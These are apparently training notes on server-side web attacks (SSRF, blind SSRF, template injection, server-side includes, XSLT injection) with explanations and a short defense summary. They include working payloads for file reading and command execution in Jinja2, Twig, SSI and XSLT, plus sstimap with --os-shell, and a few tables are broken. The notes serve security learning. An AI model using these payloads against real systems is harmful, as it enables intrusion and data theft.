# Server Side Attacks

\*\*Wordlist used in these module

```
/opt/SecLists/Discovery/Web-Content/raft-small-words.txt
```

### Server-Side Request Forgery

This section introduces **Server-Side Request Forgery (SSRF)**, a critical vulnerability included in the **OWASP Top 10**. Essentially, it happens when you can trick a web server into acting as a "proxy" to make requests to locations it shouldn't access—either internally or externally.

***

**Core Concept: The "Middleman" Attack**

In a normal scenario, a web application might fetch a remote resource (like a profile picture from another site or a weather API) based on a URL you provide. In an SSRF attack, the attacker changes that URL to point to:

* **Internal Services:** Admin panels, databases, or cloud metadata services (like AWS/Azure/GCP) that aren't exposed to the public internet.
* **The Server Itself:** Accessing local services running on `127.0.0.1` (localhost).

**Exploiting URL Schemes**

The "power" of an SSRF often depends on which **URL schemes** the server’s back-end library supports. The module highlights three major ones:

| Scheme                     | Purpose in SSRF                         | Impact                                                                                                         |
| -------------------------- | --------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| **`http://` / `https://`** | Standard web requests.                  | Bypass Firewalls/WAFs to hit internal API endpoints or restricted subnets.                                     |
| **`file://`**              | Accesses the local filesystem.          | Functions like **LFI (Local File Inclusion)**; allows reading sensitive files like `/etc/passwd`.              |
| **`gopher://`**            | An older protocol that sends raw bytes. | **Advanced:** Can be used to "talk" to non-HTTP services like MySQL, Memcached, or send SMTP (email) commands. |

**Key Takeaways**

* **Trust Issues:** The vulnerability exists because the server **trusts** the destination it is connecting to more than it trusts the user providing the URL.
* **Internal Access:** Because the request comes _from_ the server's own IP, it can often bypass IP-based access controls (firewalls) that block outside traffic.
* **Devastating Impact:** It can lead to complete information disclosure, unauthorized actions on internal tools, and sometimes even Remote Code Execution (RCE) if the internal service being hit is vulnerable.

***

**Internal Discovery (Accessing Restricted Endpoints)**

The first step is moving from the public internet to the internal network. Even if a domain like `dateserver.htb` is blocked externally, the vulnerable web server can see it.

* **The Technique:** Using tools like **ffuf** to "fuzz" the internal server through the SSRF parameter.
* **The Filter:** Since you are looking at responses through a "window," you have to filter out the noise (like Apache's default 404/403 pages) to find the actual hidden endpoints, such as `admin.php`.

**Local File Inclusion (LFI) via `file://`**

SSRF isn't just for web pages. If the server’s backend library (like cURL) is configured to handle multiple protocols, you can jump from the network to the **local filesystem**.

* **The Payload:** `file:///etc/passwd`
* **The Impact:** This allows you to read sensitive configuration files, source code, or even SSH keys directly from the server's hard drive.

**The Gopher Protocol (The POST Workaround)**

Standard SSRF via `http://` usually limits you to **GET** requests. If an internal admin page requires a **POST** (like a login form), `http://` won't work. This is where the **Gopher protocol** shines.

* **Raw Data:** Gopher allows you to send **arbitrary bytes** to a port. You essentially "type out" a full HTTP POST request, including headers and body.
* **Double Encoding:** This is the tricky part. Because your payload is sitting inside a URL parameter that the server will decode once, you must **URL-encode your payload twice** to ensure the Gopher protocol receives the correct characters (like newlines and spaces).

**Gopherus: The Swiss Army Knife**

Constructing Gopher payloads by hand for complex services is tedious. **Gopherus** automates this by generating ready-to-use Gopher strings for several "high-value" internal services:

| Service              | Potential Impact                                              |
| -------------------- | ------------------------------------------------------------- |
| **MySQL/PostgreSQL** | Run database queries or leak user data.                       |
| **Redis**            | Often leads to **Remote Code Execution (RCE)** via cron jobs. |
| **FastCGI**          | Bypasses the web server to execute PHP code directly.         |
| **SMTP**             | Send internal emails (Phishing/Spam) from a trusted server.   |

***

**Summary of Exploitation Logic**

1. **Fuzzing:** Find the internal "hidden" targets.
2. **LFI:** Read the source code to find passwords or logic flaws.
3. **Gopher:** Send POST requests to log in or interact with non-HTTP services.
4. **RCE:** Use Gopherus to exploit services like Redis or FastCGI for full system control.

**Blind SSRF** is a variation of Server-Side Request Forgery where the web application fetches a remote resource but does **not** return the content of that resource in its HTTP response.

In a "Regular" SSRF, you might see the internal page's HTML or an image preview. In a **Blind** SSRF, you usually only see a generic "Success," "Error," or a simple change in response time. This makes it significantly harder to exploit because you are essentially "attacking in the dark."

**Detection: How to "See" the Blind**

Since the server won't show you what it fetched, you have to use **Out-of-Band (OOB)** techniques to confirm the vulnerability.

* **DNS/HTTP Interaction:** You provide a URL to a server you control (like Burp Collaborator, Interactsh, or a simple Webhook.site). If your server receives a DNS lookup or an HTTP request from the target's IP, you have confirmed the SSRF.
* **Time-Based Detection:** If OOB is blocked by a firewall, you look for differences in response times.
  * A request to an **open** internal port (e.g., `127.0.0.1:80`) might respond instantly.
  * A request to a **closed** internal port (e.g., `127.0.0.1:9999`) might hang for 30 seconds before timing out.

**Comparison: Regular vs. Blind SSRF**

| Feature                  | Regular (In-Band) SSRF                 | Blind SSRF                                  |
| ------------------------ | -------------------------------------- | ------------------------------------------- |
| **Response Body**        | Contains data from the internal URL.   | Static (e.g., "OK", "Thank you").           |
| **Confirmation**         | Immediate (you see the internal file). | Requires OOB listeners or timing analysis.  |
| **Ease of Exploitation** | High (can read files/pages directly).  | Medium to High (requires blind techniques). |
| **Impact**               | Data exfiltration, RCE, Port Scanning. | Port Scanning, Blind RCE, Internal Poking.  |

***

**Common Exploitation Scenarios**

Even without seeing the response, Blind SSRF is dangerous. Here is how attackers utilize it:

**A. Internal Port Scanning**

By sending requests to `127.0.0.1:[PORT]` and measuring the response time or the error message (e.g., "Connection Refused" vs. "Timed Out"), an attacker can map out which services are running internally.

**B. Hitting Cloud Metadata**

On AWS, Azure, or GCP, internal metadata services sit at `169.254.169.254`. An attacker might try to trigger a Blind SSRF to this IP to make the server perform actions, such as changing its own configuration or sending credentials to an external listener.

**C. Triggering Further Vulnerabilities**

If the internal service the server hits is vulnerable to something like **Shellshock** or a specific header-based exploit, the attacker can use the Blind SSRF to deliver the payload.

* _Example:_ `?url=http://internal-admin:80` with a malicious `User-Agent` header.

**Advanced Blind Techniques**

* **DNS Rebinding:** If the server has a filter that blocks internal IPs (like `127.0.0.1`), an attacker can use a domain that initially resolves to a safe public IP but, on the second request, resolves to `127.0.0.1`.
* **Gopher for Blind POSTs:** As we discussed with `gopher://`, you can use it to send blind POST requests to internal tools (like a "Delete User" button) where you don't need to see the result to know it worked.

**Defense Summary**

1. **Allowlisting:** Only allow requests to specific, trusted domains and protocols (`https` only).
2. **Network Isolation:** Ensure the web server cannot communicate with sensitive internal subnets or the metadata IP.
3. **Disable Unused Schemes:** Turn off support for `file://`, `gopher://`, `ftp://`, etc.

***

***

## Server side template injection

**What is a Template Engine?**

Think of a template engine as a **"Fill-in-the-Blanks" system** for web pages.

* Instead of writing 100 separate HTML files for 100 different users, a developer writes **one template**.
* The template has "placeholders" (like `{{ name }}`) where the unique data goes.
* The engine then combines the template with actual data to create the final page the user sees.

**The Rendering Process**

The act of combining the template and the data is called **Rendering**. It requires two main inputs:

| **Input**       | **Description**                                | **Example**                     |
| --------------- | ---------------------------------------------- | ------------------------------- |
| **Template**    | The "skeleton" or static HTML file.            | `<h1>Welcome, {{ user }}!</h1>` |
| **Values/Data** | The dynamic info (usually as key-value pairs). | `user: "Umedh"`                 |
| **Result**      | The final HTML sent to the browser.            | `<h1>Welcome, Umedh!</h1>`      |

**Key Features and Logic**

Modern engines like **Jinja** (Python) and **Twig** (PHP) do more than just swap text; they can handle programming logic:

* **Variables:** Used for simple data replacement (e.g., `{{ variable_name }}`).
* **Conditionals:** Can show different content based on a rule (e.g., _if user is logged in, show "Logout", else show "Login"_).
* **Loops:** Can repeat a section of HTML for a list of items (e.g., displaying all products in a shopping cart using `{% for item in items %}`).

**Why Use Them?**

* **Maintainability:** If you want to change the website header, you only change it in **one** template file instead of every single page.
* **Consistency:** Ensures the layout remains the same across the entire application.
* **Separation of Concerns:** Developers can work on the backend logic while designers work on the frontend templates

\*\*Confirming SSTI

The process of identifying an SSTI vulnerability is similar to the process of identifying any other injection vulnerability, such as SQL injection. The most effective way is to inject special characters with semantic meaning in template engines and observe the web application's behavior. As such, the following test string is commonly used to provoke an error message in a web application vulnerable to SSTI, as it consists of all special characters that have a particular semantic purpose in popular template engines:

```
${{<%[%'"}}%\.
```

Since the above test string should almost certainly violate the template syntax, it should result in an error if the web application is vulnerable to SSTI. This behavior is similar to how injecting a single quote (`'`) into a web application vulnerable to SQL injection can break an SQL query's syntax, resulting in an SQL error.

**The SSTI Identification**

You send specific payloads and observe which ones result in `49` and which ones cause an error or return the literal text.

| **Payload** | **If Result is 49...**                                 | **If Result is \{{7\*7\}}...**           |
| ----------- | ------------------------------------------------------ | ---------------------------------------- |
| `${7*7}`    | Likely **Java (Smarty/FreeMarker)** or **PHP (Twig)**. | Try `{{7*7}}`.                           |
| `{{7*7}}`   | Likely **Python (Jinja2/Mako)** or **PHP (Twig)**.     | Try `#{7*7}`.                            |
| `{{7*'7'}}` | If result is `7777777`, it’s **Jinja2/Twig**.          | If result is `49`, it’s likely **Mako**. |

| **Test Payload**     | **Jinja2 (Python) Result**     | **Twig (PHP) Result**      |
| -------------------- | ------------------------------ | -------------------------- |
| **`{{7*'7'}}`**      | **`7777777`** (Repeats string) | **`49`** (Converts to int) |
| **`{{_self}}`**      | Usually an **Error**           | Returns **Object** string  |
| **`{{config}}`**     | Returns **Flask Config**       | Usually an **Error**       |
| **`{{dump(user)}}`** | Usually an **Error**           | Dumps **PHP Object**       |
| \*\*\`\{{\[2]        | filter('system')\}}\`\*\*      | **Error** (Invalid filter) |

**Common Engine Syntax Clues**

If you can't run a full decision tree, look for these signature syntax styles:

* **Jinja2 (Python) / Twig (PHP):** Uses double curly braces `{{ ... }}` and control tags `{% ... %}`.
* **Mako (Python):** Uses `${ ... }` and `%` for control lines.
* **Ruby (ERB):** Uses `<%= ... %>`.
* **Java (Spring/Thymeleaf):** Uses `th:text="${...}"` within HTML tags.
* **Node.js (Pug/Jade):** Uses indentation-based syntax

**Tplmap:** The "SQLmap" of template injection. It can automatically detect and exploit SSTI across dozens of different engines.

```
python tplmap.py -u "http://target.com/?name=test"
```

\*\*Jinja2 template injection payloads

| **Attack Goal**            | **Payload**                                                                        | **What it actually does**                                                                         |
| -------------------------- | ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| **Dump Config**            | `{{ config.items() }}`                                                             | Spills the entire Flask configuration (API keys, Secret Keys, Database strings).                  |
| **Discover Built-ins**     | `{{ self.__init__.__globals__.__builtins__ }}`                                     | Maps out the "Global" dictionary to find where Python hides core functions like `open` or `eval`. |
| **Read Local Files (LFI)** | `{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}`          | Uses the discovered `open` function to grab sensitive system files and display them.              |
| **Execute Commands (RCE)** | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Forces Python to import the `os` library and run shell commands (like `id`, `ls`, or `whoami`).   |

\*\*Twig template injection payloads

| **Attack Category**             | **Payload**         | **Technical Explanation**                                                                                                |
| ------------------------------- | ------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| **Information Disclosure**      | `{{ _self }}`       | Accesses the current template object. It’s a "low-hanging fruit" test to see if the engine recognizes internal keywords. |
| **Local File Inclusion (LFI)**  | \`\{{ "/etc/passwd" | file\_excerpt(1,-1) \}}\`                                                                                                |
| **Remote Code Execution (RCE)** | \`\{{ \['id']       | filter('system') \}}\`                                                                                                   |

\*\*The tool that helps for the SSTI sstimap

```
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

\*The above tool first test which type of server side template are using and finding it out then it start the attack when ever we can use the --os-shell means in here after finding the template it starts the for the remote code

***

***

## Server Side Includes

**Server-Side Includes (SSI)**, a legacy but still relevant technology used by web servers (like Apache and IIS) to inject dynamic content into otherwise static HTML pages.

If you’ve been working with SSTI (Template Injection), think of SSI as the "Grandfather" of templates. It’s handled directly by the web server rather than a high-level language like Python or PHP.

**Identifying SSI**

You can usually spot SSI by looking at the file extensions in the URL. While servers can be configured to use it anywhere, these are the "smoking guns":

* `.shtml`
* `.shtm`
* `.stm`

**SSI Directive Syntax**

SSI directives look like HTML comments, which is why they are often overlooked. The server sees them, executes the command, and removes the comment before the user ever sees the source code.

> **Syntax:** \`\`

**Common SSI Directives**

| **Directive**  | **Purpose**                                     | **Security Impact**                                           |
| -------------- | ----------------------------------------------- | ------------------------------------------------------------- |
| **`printenv`** | Dumps all environment variables.                | **High:** Leaks internal paths, secret keys, and server info. |
| **`echo`**     | Prints specific variables (e.g., `DATE_LOCAL`). | **Medium:** Can be used to verify the injection is working.   |
| **`config`**   | Modifies SSI settings (like error messages).    | **Low:** Usually used for setup, but can hide exploit errors. |
| **`include`**  | Includes another file in the page.              | **High:** Allows reading other files in the web root (LFI).   |
| **`exec`**     | Executes an OS command via the shell.           | **Critical:** Leads to **Remote Code Execution (RCE)**.       |

\*\*Some of the example payloads are the

```
<!--#exec cmd="id" -->
```

**How SSI Injection Happens**

Injection occurs when an application takes user input and stores it in a file that the server is configured to parse for SSI.

* **File Uploads:** You upload a file named `test.shtml` containing \`\`. If the server parses it, you see the file list.
* **Stored Input:** You submit a comment or a username containing an SSI directive. If that name is later saved into an `.shtml` file on the server, the directive triggers when the page is viewed.

**The "Golden" Payload**

If you suspect SSI is active, the first thing a researcher usually tries is the `exec` directive to get a "whoami" result:

***

***

## Extensible Markup Language Transformation Injection

XML, or **Extensible Markup Language**, is the digital equivalent of a highly organized filing cabinet. While HTML focuses on how data _looks_ (the "wallpaper"), XML is all about what the data _is_ (the "substance").

Think of it as the language that allows different systems—even those that usually don't speak to each other—to exchange information without losing the context of what that information actually represents.

***

\*\*🏗️ The Structure of XML

XML is hierarchical, meaning it follows a **tree structure**. Every document starts with a "root" element that branches out into "child" elements.

#### Basic Example:

XML

```
<?xml version="1.0" encoding="UTF-8"?>
<bookstore>
  <book category="cooking">
    <title lang="en">The Art of Sourdough</title>
    <author>Jane Baker</author>
    <year>2024</year>
    <price>25.00</price>
  </book>
</bookstore>
```

\*\*🔑 Key Features

* **Self-Descriptive:** You define your own tags (like `<author>` or `<price>`). There are no "predefined" tags like in HTML.
* **Platform Independent:** It’s just plain text, so it can be read by a Mac, PC, or a smart fridge.
* **Strict Rules:** XML doesn't tolerate mistakes. If you forget to close a tag, the whole thing breaks. This ensures data integrity.

\*\*XML 🆚 HTML

People often confuse the two because they both use brackets, but they have very different jobs:

| Feature              | XML                            | HTML                                     |
| -------------------- | ------------------------------ | ---------------------------------------- |
| **Primary Goal**     | Carry and store data.          | Display data and look pretty.            |
| **Tags**             | Extensible (you make them up). | Predefined (e.g., `<h1>`, `<p>`, `<a>`). |
| **Case Sensitivity** | Yes (Strict).                  | No (Flexible).                           |
| **Closing Tags**     | Mandatory.                     | Often optional (though discouraged).     |

\*\*📜 Essential Syntax Rules

To be "well-formed," an XML document must follow these rules:

1. **Must have a root element:** Everything must be contained inside one single parent tag.
2. **All tags must close:** If you open `<tag>`, you must eventually have `</tag>`.
3. **Tags are case-sensitive:** `<Message>` is not the same as `<message>`.
4. **Proper nesting:** Tags must be closed in the reverse order they were opened (`<b><i>Text</i></b>`).
5. **Attribute values must be quoted:** `<book category="fiction">` is correct; `<book category=fiction>` is a crime in the XML world.

\*\*🚀 Where is it used today?

Even with the rise of JSON (a lighter-weight alternative), XML is still everywhere:

* **Web Services:** SOAP (Simple Object Access Protocol) relies on XML.
* **Office Documents:** Every `.docx` or `.xlsx` file is actually a zipped collection of XML files.
* **Configuration:** Many enterprise applications use it for settings and setup.
* **SVG Images:** Scalable Vector Graphics are written in XML code.

```
POST /[ENDPOINT] HTTP/1.1
Host: [TARGET_IP]
Content-Type: application/x-www-form-urlencoded
Content-Length: [Calculated_Automatically_By_Tools]

[PARAMETER_NAME]=<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
  <root>
    <output>
      <xsl:value-of select="php:function('shell_exec', 'cat /flag.txt')" />
    </output>
  </root>
</xsl:template>
</xsl:stylesheet>
```

_Suppose the application using the XML and you find that there is chance for the XML injection for that first we need to define our tags to execute XML injection like the above_
